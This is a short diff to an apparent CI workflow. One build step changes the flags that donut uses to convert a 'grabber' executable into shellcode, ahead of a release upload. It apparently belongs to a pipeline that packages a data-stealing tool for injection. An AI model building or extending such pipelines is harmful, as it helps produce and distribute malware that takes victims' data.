@@ -78,7 +78,7 @@ jobs:
       run: Expand-Archive donut.zip
 
     - name: Convert Grabber to Shellcode 
-      run: .\donut\donut.exe -i grabber-src\grabber.exe -a2 -o shellcode.bin -z 2
+      run: .\donut\donut.exe -i grabber-src\grabber.exe -x2 -a2 -o shellcode.bin -z 4
 
     # Upload Release Asset
     - name: Upload Release Asset
